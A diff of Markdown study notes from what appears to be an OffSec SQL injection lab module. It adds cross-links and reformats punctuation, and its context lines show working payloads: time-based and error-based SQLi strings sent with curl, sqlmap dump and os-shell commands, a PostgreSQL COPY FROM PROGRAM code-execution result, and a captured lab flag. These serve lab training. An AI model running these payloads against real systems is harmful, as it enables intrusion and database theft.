@@ -112,6 +112,9 @@ select * from offsec.dbo.users;
 ```
 *Note the `dbo` schema name required between the database and table names for MSSQL, MySQL doesn't need this.*
 ![[Pasted image 20260802001858.png]]
+
+> 📋 Generalized copy-pasteable commands for this technique: [[SQL Injection & Databases#MySQL|Command Appendix]] and [[SQL Injection & Databases#MSSQL (Impacket)|MSSQL section]]
+
 #### Tags: #MySQLBasics #MSSQLBasics #ImpacketMSSQLClient #TDSProtocol #SysDatabases
 
 **Lab status: ✅ Completed:**
@@ -306,6 +309,9 @@ http://<target>/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
 
 > 🔗 **HackTricks** SQL Injection overview: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/sql-injection/README.md) *(linking to the book's own GitHub source, not the live site, book.hacktricks.wiki currently sits behind a bot-paywall gateway that blocks automated/tool-based access)* · **PayloadsAllTheThings** SQL Injection overview: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md)
 
+> 📋 Generalized copy-pasteable commands for this technique: [[SQL Injection & Databases#SQL Injection Payloads|Command Appendix]]
+> 🧭 Quick lookup: [[SQL Injection & Databases (Decision Tree)|Decision Tree]]
+
 #### Tags: #BlindSQLi #BooleanBasedBlind #TimeBasedBlind #SleepPayload
 
 **Lab status: ✅ Completed:**
@@ -400,10 +406,10 @@ Before you can point sqlmap at anything, you need two things off the actual page
 </form>
 ```
 
-- `method="POST"` — the browser sends your search as hidden POST body data, not as part of the URL. (If this said `GET` instead, or was missing entirely, you'd see the parameter appear directly in the address bar after submitting, e.g. `?item=test`, and sqlmap would just take a `-u "...?item=test"` URL with no `--data` needed.)
-- `name="item"` on the `<input>` — this is the actual parameter name the backend code reads, regardless of what the field is labeled on-screen ("Lookup:"). This is the value that matters for sqlmap's `-p` flag, not the visible label text.
+- `method="POST"`, the browser sends your search as hidden POST body data, not as part of the URL. (If this said `GET` instead, or was missing entirely, you'd see the parameter appear directly in the address bar after submitting, e.g. `?item=test`, and sqlmap would just take a `-u "...?item=test"` URL with no `--data` needed.)
+- `name="item"` on the `<input>`, this is the actual parameter name the backend code reads, regardless of what the field is labeled on-screen ("Lookup:"). This is the value that matters for sqlmap's `-p` flag, not the visible label text.
 
-*General skill, not just this VM: whenever you hit a form and aren't sure how to attack it, `curl` the page and grep for `<form` and `<input` tags. The `method` attribute tells you GET vs POST, and each `name="..."` tells you the real parameter name to target. Same lookup you did for the login form's `$uid` field back in [[SQL Injection Attacks#10.2.1. Error-Based Payloads|10.2.1]].*
+*General skill, not just this VM: whenever you hit a form and aren't sure how to attack it, `curl` the page and grep for `<form` and `<input` tags. The `method` attribute tells you GET vs POST, and each `name="..."` tells you the real parameter name to target. Same lookup you did for the login form's `$uid` field back in [[SQL Injection Attacks#10.2.1. Identifying SQLi via Error-Based Payloads|10.2.1]].*
 
 **Step 1: Basic discovery scan**
 ```bash
@@ -417,10 +423,10 @@ sqlmap -u "http://<target>/blindsqli.php?user=1" -p user
 ```bash
 sqlmap -u "http://192.168.245.19/search.php" --data="item=test" -p item --batch
 ```
-- `-u` — the page URL sqlmap sends the request to.
-- `--data="item=test"` — since this form is `POST` (found via Step 0 above), this tells sqlmap to send a POST request with body `item=test`, mimicking what the form itself sends when you hit SEARCH. (For a GET form you'd skip `--data` and just put the parameter straight in the `-u` URL instead, like the generic `blindsqli.php?user=1` example below.)
-- `-p item` — tells sqlmap specifically to test the `item` field for injection. Without this it tries every parameter/header it can find, which is slower and noisier.
-- `--batch` — auto-answers sqlmap's yes/no prompts with sensible defaults so it doesn't stop and wait on interactive input.
+- `-u`, the page URL sqlmap sends the request to.
+- `--data="item=test"`, since this form is `POST` (found via Step 0 above), this tells sqlmap to send a POST request with body `item=test`, mimicking what the form itself sends when you hit SEARCH. (For a GET form you'd skip `--data` and just put the parameter straight in the `-u` URL instead, like the generic `blindsqli.php?user=1` example below.)
+- `-p item`, tells sqlmap specifically to test the `item` field for injection. Without this it tries every parameter/header it can find, which is slower and noisier.
+- `--batch`, auto-answers sqlmap's yes/no prompts with sensible defaults so it doesn't stop and wait on interactive input.
 ![[Pasted image 20260802233122.png]]
 
 **Worked result (VM #2 discovery):** sqlmap found the `item` parameter injectable via all four major techniques at once: boolean-based blind, error-based (EXTRACTVALUE), UNION-based (5 columns, same count as the manual UNION work in 10.2.2), and **time-based blind** (`item=test' OR SLEEP(5)-- cwYP`). Backend confirmed as MySQL >= 5.1 on Linux Ubuntu 22.04 / PHP / Apache 2.4.52. Since a page usually only needs one working technique found to move on, having all four here just means the app has zero input sanitization at all on this field, sqlmap doesn't need to guess which one to use for extraction.
@@ -436,9 +442,9 @@ sqlmap -u "http://<target>/blindsqli.php?user=1" -p user --dump
 sqlmap -u "http://192.168.245.19/search.php" --data="item=test" -p item --batch --technique=T -T users --dump
 ```
 ![[Pasted image 20260803222923.png]]
-- `--technique=T` — restricts sqlmap to only the **T**ime-based blind method (sqlmap's technique letters: B=boolean, E=error, U=union, S=stacked, T=time, Q=inline). Without this, sqlmap defaults to whichever technique it found is fastest, here that would've been UNION-based, not the time-based blind the lab specifically wants practiced.
-- `-T users` — dump only the `users` table, instead of every table in the current database.
-- `--dump` — extract and print the table's rows once the injection point is confirmed.
+- `--technique=T`, restricts sqlmap to only the **T**ime-based blind method (sqlmap's technique letters: B=boolean, E=error, U=union, S=stacked, T=time, Q=inline). Without this, sqlmap defaults to whichever technique it found is fastest, here that would've been UNION-based, not the time-based blind the lab specifically wants practiced.
+- `-T users`, dump only the `users` table, instead of every table in the current database.
+- `--dump`, extract and print the table's rows once the injection point is confirmed.
 
 *Since no `-D <database>` was given, sqlmap fell back to whatever database the app's own query is already using (fetched automatically and printed as `offsec`), same current-database concept as MySQL's `database()` function used manually in [[SQL Injection Attacks#10.2.2. UNION-Based Payloads|10.2.2]].*
 
@@ -469,6 +475,9 @@ sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
 🔁 **Similar to:** `--os-shell` is doing exactly the same `INTO OUTFILE` + webshell trick from 10.3.1 manually, sqlmap just automates the write, the upload, and the `cmd`-parameter interaction into one flow.
 
 > ⚡ **On [[MODERN TOOLING]] for this module:** deliberately no addition. sqlmap, covered above, already *is* the automation tool this whole category is about, it's not something to "speed up" further, it's core curriculum here. See [[MODERN TOOLING#Modules with no addition, and why|MODERN TOOLING's own note]] on why this module is a deliberate skip.
+
+> 📋 Generalized copy-pasteable commands for this technique: [[SQL Injection & Databases#Sqlmap|Command Appendix]]
+> 🧭 Quick lookup: [[SQL Injection & Databases (Decision Tree)|Decision Tree]]
 
 #### Tags: #Sqlmap #SqlmapDump #SqlmapOsShell #WebRootParam
 
@@ -636,7 +645,7 @@ Response included a raw MySQL error: `You have an error in your SQL syntax ... n
 ```bash
 time curl -X POST --data "mail-list=test' OR SLEEP(5)-- -" http://192.168.156.48/index.php -o /dev/null -s
 ```
-Delay was ~30s for a `SLEEP(5)` payload, a consistent 6x multiplier (confirmed again at `SLEEP(1)` → ~6s), later explained by the table having exactly 6 rows. Since the app **does** echo raw SQL error text though, error-based extraction via `extractvalue()` is much faster than timing every guess byte-by-byte, same trick as [[SQL Injection Attacks#10.2.1. Error-Based Payloads|10.2.1]]:
+Delay was ~30s for a `SLEEP(5)` payload, a consistent 6x multiplier (confirmed again at `SLEEP(1)` → ~6s), later explained by the table having exactly 6 rows. Since the app **does** echo raw SQL error text though, error-based extraction via `extractvalue()` is much faster than timing every guess byte-by-byte, same trick as [[SQL Injection Attacks#10.2.1. Identifying SQLi via Error-Based Payloads|10.2.1]]:
 ```bash
 curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -" http://192.168.156.48/index.php | grep -i "XPATH"
 # XPATH syntax error: '~8.0.29'
@@ -765,7 +774,7 @@ curl -s -X POST --data "weight=70&height=x%' UNION SELECT NULL,CAST((SELECT stri
 ```
 Confirmed RCE: `uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)`. This needed **stacked queries** (multiple `;`-separated statements in one call), which only works here because the backend uses PHP's `pg_query()`, which allows it (unlike `mysqli_query`, which needs `multi_query` explicitly). `COPY FROM PROGRAM` pipes a command's stdout into a table as rows, there's no direct return channel, so the output has to be read back out through the same `CAST()`-error trick used for data extraction.
 
-> 🔍 Full breakdown of the `COPY FROM PROGRAM` mechanics: [[SQL Injection (Breakdowns)#PostgreSQL RCE via COPY FROM PROGRAM (superuser only)|Command Breakdowns]]
+> 🔍 Full breakdown of the `COPY FROM PROGRAM` mechanics: [[SQL Injection (Breakdowns)#PostgreSQL RCE via COPY ... FROM PROGRAM (superuser only)|Command Breakdowns]]
 
 **Step 13: Reverse shell**
 
@@ -922,6 +931,9 @@ type C:\inetpub\wwwroot\flag.txt
 ![[Pasted image 20260804155004.png]]
 
 **Lab answer:** **`OS{7bd87d8765fe9fab57092823659332a7}`**
+
+> 📋 Generalized copy-pasteable commands for this technique: [[SQL Injection & Databases|Command Appendix]]
+> 🧭 Quick lookup: [[SQL Injection & Databases (Decision Tree)|Decision Tree]]
 
 #### Tags: #Lab #Quiz #Module10 #Capstone #MSSQL #ASPNETWebForms #StackedQueries #XpCmdshell
 
